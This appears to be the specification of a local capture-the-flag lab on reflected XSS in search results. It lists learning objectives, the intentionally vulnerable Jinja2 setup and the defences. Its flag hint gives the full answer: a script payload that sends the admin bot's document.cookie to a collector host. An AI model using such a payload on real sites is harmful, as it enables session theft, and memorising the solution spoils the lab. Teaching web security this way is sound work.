title: Reflected XSS in Search Results
learning_objectives: Identify a reflected XSS sink: a request parameter echoed into an HTML context with no output encoding
Construct a <script> payload that reads document.cookie in the victim's browser
Understand the victim-bot delivery model — the payload executes in the admin's session, not yours
Use an out-of-band collector to exfiltrate the stolen cookie across an egress-dropped network
Recognise HttpOnly cookies and contextual output encoding as the two independent defences
flag_hint: Submit /?q=<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script> to POST /report; the admin bot visits it carrying its session cookie. Read the exfiltrated cookie via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: Jinja2 (autoescape disabled on the search render)
inspired_by: The canonical PortSwigger 'Reflected XSS into HTML context' lab pattern, abstracted for local Docker with a Playwright victim bot and an OOB collector
